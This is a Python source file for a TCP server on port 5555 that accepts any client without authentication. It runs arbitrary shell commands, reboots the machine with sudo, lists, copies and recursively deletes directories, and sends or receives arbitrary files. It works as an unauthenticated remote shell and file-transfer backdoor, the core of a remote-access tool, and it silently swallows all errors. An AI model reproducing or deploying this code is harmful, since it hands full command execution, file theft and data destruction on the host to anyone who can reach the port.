import socket
import threading
import time
import os
import subprocess
import platform
import shutil
from typing import List, Optional

# DirectoryUtils class
class DirectoryUtils:
    @staticmethod
    def get_current_directory() -> str:
        try:
            return os.getcwd()
        except Exception:
            return ""

    @staticmethod
    def set_current_directory(path: str) -> bool:
        try:
            if not os.path.exists(path):
                return False
            os.chdir(path)
            return True
        except Exception:
            return False

    @staticmethod
    def get_parent_directory(path: Optional[str] = None) -> str:
        try:
            target = path if path else os.getcwd()
            parent = os.path.dirname(target)
            return parent if parent else ""
        except Exception:
            return ""

    @staticmethod
    def list_files(path: str) -> List[str]:
        try:
            if not os.path.exists(path):
                return []
            return [os.path.join(path, f) for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
        except Exception:
            return []

    @staticmethod
    def list_folders(path: str) -> List[str]:
        try:
            if not os.path.exists(path):
                return []
            return [os.path.join(path, f) for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
        except Exception:
            return []

    @staticmethod
    def list_files_and_folders(path: str) -> List[str]:
        try:
            if not os.path.exists(path):
                return []
            return [os.path.join(path, f) for f in os.listdir(path)]
        except Exception:
            return []

    @staticmethod
    def list_files_recursive(path: str) -> List[str]:
        try:
            if not os.path.exists(path):
                return []
            files = []
            for root, _, filenames in os.walk(path):
                for filename in filenames:
                    files.append(os.path.join(root, filename))
            return files
        except Exception:
            return []

    @staticmethod
    def list_folders_recursive(path: str) -> List[str]:
        try:
            if not os.path.exists(path):
                return []
            folders = []
            for root, dirnames, _ in os.walk(path):
                for dirname in dirnames:
                    folders.append(os.path.join(root, dirname))
            return folders
        except Exception:
            return []

    @staticmethod
    def create_directory(path: str) -> bool:
        try:
            if not os.path.exists(path):
                os.makedirs(path)
                return True
            return False
        except Exception:
            return False

    @staticmethod
    def delete_directory(path: str, recursive: bool = False) -> bool:
        try:
            if os.path.exists(path):
                if recursive:
                    shutil.rmtree(path)
                else:
                    os.rmdir(path)
                return True
            return False
        except Exception:
            return False

    @staticmethod
    def copy_directory(source_dir: str, target_dir: str, overwrite: bool = False) -> bool:
        try:
            if not os.path.exists(source_dir):
                return False
            os.makedirs(target_dir, exist_ok=True)
            for item in os.listdir(source_dir):
                src_path = os.path.join(source_dir, item)
                dst_path = os.path.join(target_dir, item)
                if os.path.isfile(src_path):
                    shutil.copy2(src_path, dst_path)
                elif os.path.isdir(src_path):
                    DirectoryUtils.copy_directory(src_path, dst_path, overwrite)
            return True
        except Exception:
            return False

    @staticmethod
    def get_directory_size(path: str) -> int:
        try:
            if not os.path.exists(path):
                return 0
            total_size = 0
            for root, _, files in os.walk(path):
                for file in files:
                    total_size += os.path.getsize(os.path.join(root, file))
            return total_size
        except Exception:
            return 0

    @staticmethod
    def directory_is_empty(path: str) -> bool:
        try:
            if not os.path.exists(path):
                return True
            return not any(os.scandir(path))
        except Exception:
            return True

    @staticmethod
    def invoke_method(command: str) -> str:
        try:
            if not command or command.isspace():
                return "Error: Empty command."

            parts = command.split(',')
            method_name = parts[0].strip()
            args = parts[1:]

            method = getattr(DirectoryUtils, method_name.lower(), None)
            if not method:
                return f"Error: Method '{method_name}' not found."

            try:
                result = method(*args)
                if isinstance(result, list):
                    return f"{method_name},{','.join(map(str, result))}"
                elif isinstance(result, bool):
                    return f"{method_name},{str(result).lower()}"
                return f"{method_name},{result}"
            except Exception as ex:
                return f"Error: Exception while invoking '{method_name}': {ex}"
        except Exception as ex:
            return f"Unexpected Error: {ex}"

# TCPServer class
class TCPServer:
    def __init__(self, port: int = 5555):
        self.port = port
        self.server = None
        self.listener_thread = None
        self.clients = []
        self.client_lock = threading.Lock()
        self.buffer_size = 4050
        self.running = False

    def start_server(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(('0.0.0.0', self.port))
            self.server.listen(5)
            self.running = True
            self.listener_thread = threading.Thread(target=self.listen_for_clients, daemon=True)
            self.listener_thread.start()
        except Exception:
            pass

    def listen_for_clients(self):
        while self.running:
            try:
                self.server.settimeout(1.0)
                client, addr = self.server.accept()
                with self.client_lock:
                    self.clients.append(client)
                client_thread = threading.Thread(target=self.handle_client_comm, args=(client,), daemon=True)
                client_thread.start()
            except socket.timeout:
                continue
            except Exception:
                pass

    def execute_command(self, command: str) -> str:
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                check=True, 
                capture_output=True, 
                text=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError as ex:
            return f"Error: {ex.stderr.strip()}"
        except Exception as ex:
            return f"Error: {str(ex)}"

    def reboot_system(self):
        try:
            if platform.system().lower() == "linux":
                subprocess.run("sudo reboot", shell=True, check=True)
            else:
                pass
        except Exception:
            pass

    def handle_client_comm(self, client: socket.socket):
        try:
            while self.running:
                if self.buffer_size <= 0:
                    self.buffer_size = 1
                data = client.recv(self.buffer_size)
                if not data:
                    break

                text = data.decode('utf-8').strip()

                if text == "x":
                    client.send("x".encode('utf-8'))
                elif text == "reboot":
                    client.send("Initiating reboot...".encode('utf-8'))
                    threading.Thread(target=self.reboot_system, daemon=True).start()
                elif text.startswith("cmdinput"):
                    command = text[len("cmdinput"):].strip()
                    if command:
                        threading.Thread(target= lambda :client.send(f"cmdoutput{self.execute_command(command)}".encode('utf-8'))).start()
                    else:
                        client.send("cmdoutputError: No command provided".encode('utf-8'))
                elif text.startswith("fileInPut"):
                    command = text[len("fileInPut"):].strip()
                    result = DirectoryUtils.invoke_method(command)
                    client.send(f"fileOutPut{result}".encode('utf-8'))
                elif text.startswith("fileOutPut"):
                    pass
                elif text.startswith("getFile"):
                    path = text[len("getFile"):].strip()
                    threading.Thread(target=self.send_file_over_tcp_auto_port,args=(client, path), daemon=True).start()
                elif text.startswith("setFile"):
                    info = text[len("setFile"):].strip()
                    parts = info.split(',')
                    if len(parts) == 3:
                        try:
                            file_name, file_size, port = parts
                            file_size = int(file_size)
                            port = int(port)
                            client_ip = client.getpeername()[0]
                            file_path = os.path.join(DirectoryUtils.get_current_directory(), file_name)
                            threading.Thread(target=self.receive_file_from_tcp,args=(client_ip, port, file_path, file_size), daemon=True).start()
                        except Exception:
                            pass
                elif text.startswith("{") and text.endswith("}"):
                    pass
        except Exception:
            pass
        finally:
            with self.client_lock:
                if client in self.clients:
                    self.clients.remove(client)
            client.close()

    def send_file_over_tcp_auto_port(self, client: socket.socket, file_path: str, timeout_seconds: int = 10):
        try:
            if not os.path.exists(file_path):
                return

            file_info = os.stat(file_path)
            file_name = os.path.basename(file_path)
            file_size = file_info.st_size

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', 0))
            server.listen(1)
            port = server.getsockname()[1]

            client.send(f"setFile{file_name},{file_size},{port}".encode('utf-8'))

            server.settimeout(timeout_seconds)
            start = time.time()
            while True:
                try:
                    file_client, _ = server.accept()
                    break
                except socket.timeout:
                    if time.time() - start > timeout_seconds:
                        server.close()
                        return

            with file_client:
                with open(file_path, 'rb') as f:
                    total_sent = 0
                    while total_sent < file_size:
                        data = f.read(8192)
                        if not data:
                            break
                        file_client.send(data)
                        total_sent += len(data)
            server.close()
        except Exception:
            pass

    def receive_file_from_tcp(self, ip: str, port: int, save_file_path: str, expected_file_size: int):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ip, port))

            os.makedirs(os.path.dirname(save_file_path), exist_ok=True)
            with open(save_file_path, 'wb') as f:
                total_read = 0
                while total_read < expected_file_size:
                    data = client.recv(8192)
                    if not data:
                        break
                    f.write(data)
                    total_read += len(data)
            client.close()
        except Exception:
            pass

    def close_server(self):
        self.running = False
        if self.server:
            self.server.close()
        with self.client_lock:
            for client in self.clients:
                client.close()
            self.clients.clear()

# Main execution for testing
if __name__ == "__main__":
    
    tcp_server = TCPServer(port=5555)
    tcp_server.start_server()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tcp_server.close_server()
        